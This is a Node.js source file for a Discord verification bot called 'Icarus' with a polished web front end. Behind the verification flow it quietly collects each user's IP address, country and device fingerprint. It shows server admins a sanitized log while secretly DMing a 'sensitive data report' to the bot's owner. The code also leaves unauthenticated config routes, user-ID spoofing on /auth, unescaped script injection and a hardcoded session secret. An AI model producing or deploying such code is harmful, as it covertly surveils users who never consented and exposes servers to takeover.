const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, Partials } = require('discord.js');
const express = require('express');
const mongoose = require('mongoose');
const passport = require('passport');
const { Strategy } = require('passport-discord');
const session = require('express-session');
const MongoStore = require('connect-mongo');
const axios = require('axios');

// --- DATABASE MODELS ---
const GuildConfig = mongoose.model('GuildConfig', new mongoose.Schema({
    guildId: String,
    verifyRoleId: String,
    logChannelId: String
}));

const RequestTracker = mongoose.model('RequestTracker', new mongoose.Schema({ 
    userId: String, 
    guildId: String, 
    status: { type: String, default: 'pending' },
    fingerprint: String,
    ip: String,
    details: Object
}));

// --- BOT CLIENT ---
const client = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.DirectMessages],
    partials: [Partials.Channel]
});

let botOwner = null;
client.on('ready', async () => {
    const app = await client.application.fetch();
    botOwner = app.owner;
    console.log(`System Icarus online. Raporty kierowane do: ${botOwner.tag}`);
});

// --- SERVER SETUP ---
const app = express();
app.set('trust proxy', true);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

mongoose.connect(process.env.MONGO_URI).then(() => console.log("Połączono z bazą danych Icarus Cloud."));

app.use(session({
    secret: 'apple_enterprise_secret_2026',
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({ mongoUrl: process.env.MONGO_URI })
}));

// --- PASSPORT ---
passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));
passport.use(new Strategy({
    clientID: process.env.CLIENT_ID,
    clientSecret: process.env.CLIENT_SECRET,
    callbackURL: process.env.DOMAIN + '/auth/callback',
    scope: ['identify', 'guilds']
}, (at, rt, profile, done) => done(null, profile)));

app.use(passport.initialize());
app.use(passport.session());

// --- LUXURY UI (APPLE STYLE) ---
const UI_STYLE = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
    :root { --bg: #f5f5f7; --text: #1d1d1f; --card-bg: rgba(255, 255, 255, 0.8); --border: rgba(0,0,0,0.05); }
    body.dark-mode { --bg: #1c1c1e; --text: #f5f5f7; --card-bg: rgba(28, 28, 30, 0.8); --border: rgba(255,255,255,0.1); }
    body { background: var(--bg); color: var(--text); font-family: 'Inter', -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; transition: background 0.3s ease; overflow: hidden; }
    .card { background: var(--card-bg); backdrop-filter: saturate(180%) blur(20px); border-radius: 28px; padding: 60px; width: 440px; box-shadow: 0 20px 40px rgba(0,0,0,0.04); border: 1px solid var(--border); text-align: center; position: relative; z-index: 10; }
    h1 { font-size: 30px; font-weight: 600; letter-spacing: -1px; margin-bottom: 12px; }
    p { color: #86868b; font-size: 16px; line-height: 1.5; margin-bottom: 35px; }
    .btn { display: block; width: 100%; padding: 16px; border-radius: 14px; font-size: 17px; font-weight: 500; text-decoration: none; cursor: pointer; border: none; margin-bottom: 12px; transition: all 0.2s ease; box-sizing: border-box; }
    .btn-primary { background: #0071e3; color: white; }
    .btn-primary:hover { background: #0077ed; transform: scale(1.02); }
    .btn-secondary { background: #e8e8ed; color: #1d1d1f; }
    body.dark-mode .btn-secondary { background: #3a3a3c; color: white; }
    .top-bar { position: absolute; top: 20px; left: 20px; right: 20px; display: flex; justify-content: space-between; align-items: center; z-index: 100; }
    .country-selector { display: flex; align-items: center; background: var(--card-bg); padding: 8px 12px; border-radius: 12px; border: 1px solid var(--border); font-size: 14px; cursor: pointer; }
    .flag { width: 20px; margin-right: 8px; border-radius: 3px; }
    .theme-toggle { background: var(--card-bg); width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; border: 1px solid var(--border); cursor: pointer; }
    .loader { width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #0071e3; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 25px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    input, select { width: 100%; padding: 14px; background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px; margin: 10px 0; font-size: 15px; color: var(--text); outline: none; width: 100%; }
`;

const SHARED_JS = `
    const translations = {
        en: { title: "Icarus Cloud", desc: "Secure corporate authorization.", btnAuth: "Authorize Identity", btnDash: "System Management", country: "United Kingdom", flag: "https://flagcdn.com/w40/gb.png", scan: "Scanning device...", choose: "Select Server", verified: "Verified", access: "Access granted.", denied: "Denied", fraud: "Security Alert" },
        pl: { title: "Icarus Cloud", desc: "System autoryzacji korporacyjnej.", btnAuth: "Autoryzuj tożsamość", btnDash: "Zarządzanie systemem", country: "Polska", flag: "https://flagcdn.com/w40/pl.png", scan: "Skanowanie urządzenia...", choose: "Wybierz serwer", verified: "Zweryfikowano", access: "Dostęp przyznany.", denied: "Odmowa", fraud: "Alert bezpieczeństwa" }
    };
    function updateLang(lang) {
        const t = translations[lang];
        document.getElementById('c-name').innerText = t.country;
        document.getElementById('c-flag').src = t.flag;
        document.querySelectorAll('[data-t]').forEach(el => {
            const key = el.getAttribute('data-t');
            if (t[key]) el.innerText = t[key];
        });
        localStorage.setItem('lang', lang);
    }
    function toggleLang() { const current = localStorage.getItem('lang') || 'en'; updateLang(current === 'en' ? 'pl' : 'en'); }
    function toggleTheme() { document.body.classList.toggle('dark-mode'); localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light'); }
    document.addEventListener('DOMContentLoaded', () => {
        updateLang(localStorage.getItem('lang') || 'pl');
        if(localStorage.getItem('theme') === 'dark') document.body.classList.add('dark-mode');
    });
`;

const getWrapper = (content) => `
    <style>${UI_STYLE}</style>
    <body>
        <div class="top-bar">
            <div class="country-selector" onclick="toggleLang()">
                <img id="c-flag" src="" class="flag"> <span id="c-name"></span>
            </div>
            <div class="theme-toggle" onclick="toggleTheme()">🌓</div>
        </div>
        ${content}
        <script>${SHARED_JS}</script>
    </body>
`;

// --- WEB ROUTES ---
app.get('/', (req, res) => {
    res.send(getWrapper('<div class="card"><h1 data-t="title"></h1><p data-t="desc"></p><a href="/login?target=verify" class="btn btn-primary" data-t="btnAuth"></a><a href="/login?target=dashboard" class="btn btn-secondary" data-t="btnDash"></a></div>'));
});

app.get('/login', (req, res, next) => {
    const state = Buffer.from(JSON.stringify({ type: req.query.target || 'dashboard' })).toString('base64');
    passport.authenticate('discord', { state })(req, res, next);
});

app.get('/auth/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
    const decoded = JSON.parse(Buffer.from(req.query.state, 'base64').toString());
    res.redirect('/' + decoded.type);
});

app.get('/dashboard', (req, res) => {
    if (!req.isAuthenticated()) return res.redirect('/login');
    const guilds = req.user.guilds.filter(g => (g.permissions & 0x8) === 0x8);
    let list = guilds.map(g => `<div style="display:flex; justify-content:space-between; align-items:center; padding:15px; border-bottom:1px solid var(--border);"><span style="font-weight:500;">${g.name}</span><a href="/manage/${g.id}" class="btn-primary" style="width:auto; padding:8px 15px; font-size:12px; border-radius:8px; text-decoration:none;">Configure</a></div>`).join('');
    res.send(getWrapper(`<div class="card"><h1 data-t="btnDash"></h1><div style="text-align:left; max-height:300px; overflow-y:auto;">${list}</div></div>`));
});

app.get('/manage/:guildId', async (req, res) => {
    const guild = client.guilds.cache.get(req.params.guildId);
    if (!guild) return res.send('Error: Bot not in guild.');
    const config = await GuildConfig.findOne({ guildId: req.params.guildId }) || {};
    const channels = guild.channels.cache.filter(c => c.type === 0).map(c => `<option value="${c.id}" ${config.logChannelId===c.id?'selected':''}>#${c.name}</option>`).join('');
    res.send(getWrapper(`<div class="card"><h1>${guild.name}</h1><form action="/save/${req.params.guildId}" method="POST" style="text-align:left;"><label style="font-size:11px; opacity:0.6;">VERIFY ROLE ID</label><input name="roleId" value="${config.verifyRoleId||''}"><label style="font-size:11px; opacity:0.6;">LOG CHANNEL</label><select name="logChanId">${channels}</select><button class="btn btn-primary" style="margin-top:20px;">Save Configuration</button></form><a href="/dashboard" style="color:#0071e3; font-size:13px; text-decoration:none;">← Back</a></div>`));
});

app.post('/save/:guildId', async (req, res) => {
    await GuildConfig.findOneAndUpdate({ guildId: req.params.guildId }, { verifyRoleId: req.body.roleId, logChannelId: req.body.logChanId }, { upsert: true });
    res.redirect('/dashboard');
});

app.get('/verify', (req, res) => {
    if (!req.isAuthenticated()) return res.redirect('/login');
    const guilds = req.user.guilds.filter(g => client.guilds.cache.has(g.id));
    let list = guilds.map(g => `<a href="/auth?token=${req.user.id}&guild=${g.id}" class="btn btn-secondary">${g.name}</a>`).join('');
    res.send(getWrapper('<div class="card"><h1 data-t="choose"></h1>' + list + '</div>'));
});

app.get('/auth', (req, res) => {
    res.send(getWrapper(`<div class="card"><h1 data-t="title"></h1><p data-t="scan"></p><div class="loader"></div><script>
        const run = async () => {
            const fpData = { sw: screen.width, sh: screen.height, l: navigator.language, ua: navigator.userAgent };
            await fetch("/complete", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ userId: "${req.query.token}", guildId: "${req.query.guild}", fp: JSON.stringify(fpData) }) });
            setInterval(async () => {
                const r = await fetch("/status?userId=${req.query.token}&guildId=${req.query.guild}");
                const d = await r.json();
                if(d.status === "success") document.body.innerHTML = getWrapper('<div class="card"><h1 data-t="verified"></h1><p data-t="access"></p></div>');
                if(d.status === "rejected") document.body.innerHTML = getWrapper('<div class="card"><h1 style="color:#ff3b30" data-t="denied"></h1><p data-t="fraud"></p></div>');
            }, 3000);
        }; run();
    </script></div>`));
});

app.post('/complete', async (req, res) => {
    const { userId, guildId, fp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const config = await GuildConfig.findOne({ guildId });
    const guild = client.guilds.cache.get(guildId);
    const parsedFp = JSON.parse(fp);

    let alertReason = null;
    const duplicateIP = await RequestTracker.findOne({ ip: ip, guildId: guildId, userId: { $ne: userId }, status: 'success' });
    const ipData = await axios.get(`http://ip-api.com/json/${ip}?fields=status,proxy,hosting,country`).catch(() => ({data:{}}));
    
    if(duplicateIP) alertReason = "Multi-Account (Same IP)";
    if(ipData.data.proxy || ipData.data.hosting) alertReason = "VPN/Proxy/Hosting detected";

    await RequestTracker.findOneAndUpdate({ userId, guildId }, { status: 'pending', fingerprint: fp, ip: ip, details: parsedFp }, { upsert: true });

    // 1. PUBLIC LOG (Bez danych wrażliwych)
    const logChan = guild.channels.cache.get(config?.logChannelId);
    if(logChan) {
        const publicEmbed = new EmbedBuilder().setTitle('Verification Request').setColor(alertReason ? '#ffcc00' : '#34c759')
            .addFields({ name: 'User', value: `<@${userId}>` }, { name: 'Status', value: alertReason ? 'Pending Manual Review' : 'Auto-Approved' });
        
        if(alertReason) {
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`acc_${userId}_${guildId}`).setLabel('Approve').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`rej_${userId}_${guildId}`).setLabel('Reject').setStyle(ButtonStyle.Danger)
            );
            logChan.send({ embeds: [publicEmbed], components: [row] });
        } else {
            const member = await guild.members.fetch(userId).catch(() => null);
            if (member && config?.verifyRoleId) await member.roles.add(config.verifyRoleId);
            await RequestTracker.findOneAndUpdate({ userId, guildId }, { status: 'success' });
            logChan.send({ embeds: [publicEmbed] });
        }
    }

    // 2. PRIVATE REPORT (IP & Fingerprint TYLKO DO CIEBIE)
    if(botOwner) {
        const privateEmbed = new EmbedBuilder().setTitle('🕵️ ICARUS SENSITIVE DATA REPORT').setColor('#5865F2').setTimestamp()
            .setDescription(`Server: **${guild.name}**`)
            .addFields(
                { name: '👤 User', value: `<@${userId}> (\`${userId}\`)`, inline: true },
                { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
                { name: '🌍 Country', value: `${ipData.data.country || 'N/A'}`, inline: true },
                { name: '🔗 Server Link', value: `[Go to Server](https://discord.com/channels/${guildId})` },
                { name: '💻 Device Info', value: `\`\`\`${parsedFp.ua}\`\`\`` }
            );
        if(alertReason) privateEmbed.addFields({ name: '⚠️ Risk Factor', value: alertReason });
        botOwner.send({ embeds: [privateEmbed] }).catch(() => {});
    }
    res.json({ ok: true });
});

client.on('interactionCreate', async (i) => {
    if (!i.isButton()) return;
    const [action, uid, gid] = i.customId.split('_');
    if (action === 'acc') {
        const guild = client.guilds.cache.get(gid);
        const member = await guild.members.fetch(uid).catch(() => null);
        const config = await GuildConfig.findOne({ guildId: gid });
        if (member && config?.verifyRoleId) await member.roles.add(config.verifyRoleId);
        await RequestTracker.findOneAndUpdate({ userId: uid, guildId: gid }, { status: 'success' });
        i.update({ content: '✅ Approved.', embeds: [], components: [] });
    } else if (action === 'rej') {
        await RequestTracker.findOneAndUpdate({ userId: uid, guildId: gid }, { status: 'rejected' });
        i.update({ content: '❌ Rejected.', embeds: [], components: [] });
    }
});

app.get('/status', async (req, res) => {
    const doc = await RequestTracker.findOne({ userId: req.query.userId, guildId: req.query.guildId });
    res.json({ status: doc ? doc.status : 'pending' });
});

app.listen(process.env.PORT || 3000);
client.login(process.env.DISCORD_TOKEN);
